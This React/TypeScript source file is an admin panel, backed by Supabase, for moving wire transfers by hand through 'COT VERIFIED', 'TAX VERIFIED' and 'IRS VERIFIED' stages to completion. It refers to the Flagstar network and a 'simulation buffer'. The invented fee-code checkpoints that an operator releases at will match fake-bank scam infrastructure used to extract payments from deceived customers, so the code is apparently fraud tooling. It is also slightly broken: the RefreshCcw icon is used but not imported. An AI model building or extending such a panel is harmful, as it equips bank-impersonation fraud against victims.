import React, { useState, useEffect } from 'react';
import { supabase } from '../lib/supabase';
import { 
  Play, 
  Pause, 
  FastForward, 
  AlertCircle, 
  CheckCircle2,
  Lock,
  Unlock,
  Eye
} from 'lucide-react';

type TransactionStage = 'PENDING' | 'COT VERIFIED' | 'TAX VERIFIED' | 'IRS VERIFIED' | 'COMPLETED' | 'REJECTED';

interface Transaction {
  id: string;
  account_id: string;
  from_account: string;
  to_account: string;
  amount: number;
  type: string;
  description: string;
  status: string;
  stage: TransactionStage;
  created_at: string;
}

const TransactionPanel: React.FC = () => {
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [loading, setLoading] = useState(true);

  const fetchTransactions = async () => {
    setLoading(true);
    const { data, error } = await supabase
      .from('transactions')
      .select('*')
      .order('created_at', { ascending: false });

    if (data) setTransactions(data);
    setLoading(false);
  };

  useEffect(() => {
    fetchTransactions();
    
    // Subscribe to changes
    const channel = supabase
      .channel('admin_transactions')
      .on('postgres_changes', { event: '*', table: 'transactions' }, () => {
        fetchTransactions();
      })
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  const updateStage = async (id: string, newStage: TransactionStage) => {
    const { error } = await supabase
      .from('transactions')
      .update({ 
        stage: newStage,
        status: newStage === 'COMPLETED' ? 'APPROVED' : (newStage === 'REJECTED' ? 'REJECTED' : 'PENDING')
      })
      .eq('id', id);

    if (error) alert('Failed to update stage: ' + error.message);
  };

  const getStageColor = (stage: TransactionStage) => {
    switch (stage) {
      case 'PENDING': return 'text-gray-400 border-gray-400/20 bg-gray-400/10';
      case 'COT VERIFIED': return 'text-blue-400 border-blue-400/20 bg-blue-400/10';
      case 'TAX VERIFIED': return 'text-purple-400 border-purple-400/20 bg-purple-400/10';
      case 'IRS VERIFIED': return 'text-amber-400 border-amber-400/20 bg-amber-400/10';
      case 'COMPLETED': return 'text-emerald-400 border-emerald-400/20 bg-emerald-400/10';
      case 'REJECTED': return 'text-red-400 border-red-400/20 bg-red-400/10';
      default: return 'text-gray-400';
    }
  };

  return (
    <div className="space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-500">
      <div className="bg-[#161616] p-8 rounded-2xl border border-white/5 shadow-2xl">
        <div className="flex items-center justify-between mb-8">
          <h3 className="text-xl font-bold flex items-center gap-2">
            <RefreshCcw size={20} className="text-red-600" />
            Active Transaction Orchestration
          </h3>
          <button 
            onClick={fetchTransactions}
            className="p-2 hover:bg-white/5 rounded-lg transition-colors"
          >
            <RefreshCcw size={16} className={loading ? 'animate-spin' : ''} />
          </button>
        </div>

        <div className="overflow-x-auto">
          <table className="w-full text-left">
            <thead>
              <tr className="border-b border-white/5 text-gray-500 text-xs uppercase tracking-widest">
                <th className="pb-4 font-semibold">Transaction ID</th>
                <th className="pb-4 font-semibold">Details</th>
                <th className="pb-4 font-semibold">Amount</th>
                <th className="pb-4 font-semibold">Stage</th>
                <th className="pb-4 font-semibold text-right">Actions</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-white/5">
              {transactions.length === 0 ? (
                <tr>
                  <td colSpan={5} className="py-12 text-center text-gray-500 text-sm">
                    No active transactions in simulation buffer.
                  </td>
                </tr>
              ) : (
                transactions.map((txn) => (
                  <tr key={txn.id} className="group hover:bg-white/5 transition-colors">
                    <td className="py-4">
                      <p className="text-sm font-mono text-gray-400">{txn.id.split('-')[0]}...</p>
                      <p className="text-[10px] text-gray-600 font-mono mt-1">{new Date(txn.created_at).toLocaleString()}</p>
                    </td>
                    <td className="py-4">
                      <p className="text-sm font-medium">{txn.description || 'Wire Transfer'}</p>
                      <p className="text-xs text-gray-500">{txn.from_account} → {txn.to_account}</p>
                    </td>
                    <td className="py-4">
                      <p className={`text-sm font-bold ${txn.type === 'debit' ? 'text-red-500' : 'text-emerald-500'}`}>
                        {txn.type === 'debit' ? '-' : '+'}${Math.abs(txn.amount).toLocaleString()}
                      </p>
                    </td>
                    <td className="py-4">
                      <span className={`px-2 py-1 text-[10px] font-bold rounded-full border ${getStageColor(txn.stage)}`}>
                        {txn.stage}
                      </span>
                    </td>
                    <td className="py-4 text-right">
                      <div className="flex items-center justify-end gap-2">
                        {txn.stage !== 'COMPLETED' && (
                          <button 
                            onClick={() => {
                              const stages: TransactionStage[] = ['PENDING', 'COT VERIFIED', 'TAX VERIFIED', 'IRS VERIFIED', 'COMPLETED'];
                              const next = stages[stages.indexOf(txn.stage) + 1];
                              if (next) updateStage(txn.id, next);
                            }}
                            className="p-2 hover:bg-emerald-500/20 hover:text-emerald-500 rounded-lg transition-colors text-gray-400"
                            title="Advance Stage"
                          >
                            <FastForward size={16} />
                          </button>
                        )}
                        <button 
                          onClick={() => updateStage(txn.id, 'REJECTED')}
                          className="p-2 hover:bg-red-500/20 hover:text-red-500 rounded-lg transition-colors text-gray-400"
                          title="Reject Transaction"
                        >
                          <AlertCircle size={16} />
                        </button>
                        <button className="p-2 hover:bg-white/10 rounded-lg transition-colors text-gray-400">
                          <Eye size={16} />
                        </button>
                      </div>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        <div className="bg-[#161616] p-6 rounded-2xl border border-white/5 shadow-xl border-l-4 border-amber-500">
          <h4 className="font-bold flex items-center gap-2 mb-4">
            <Lock size={18} className="text-amber-500" />
            Override Safety Protocols
          </h4>
          <p className="text-sm text-gray-400 mb-4">
            Force completion of all pending transactions without security code validation. (ADMIN BYPASS)
          </p>
          <button className="w-full py-2 bg-amber-500/10 hover:bg-amber-500/20 text-amber-500 border border-amber-500/30 rounded-xl text-sm font-bold transition-all">
            Execute Global Bypass
          </button>
        </div>

        <div className="bg-[#161616] p-6 rounded-2xl border border-white/5 shadow-xl border-l-4 border-red-500">
          <h4 className="font-bold flex items-center gap-2 mb-4">
            <AlertCircle size={18} className="text-red-500" />
            Freeze Core Ledger
          </h4>
          <p className="text-sm text-gray-400 mb-4">
            Immediately halt all transaction processing across the entire Flagstar network.
          </p>
          <button className="w-full py-2 bg-red-500/10 hover:bg-red-500/20 text-red-500 border border-red-500/30 rounded-xl text-sm font-bold transition-all">
            Initiate Emergency Freeze
          </button>
        </div>
      </div>
    </div>
  );
};

export default TransactionPanel;
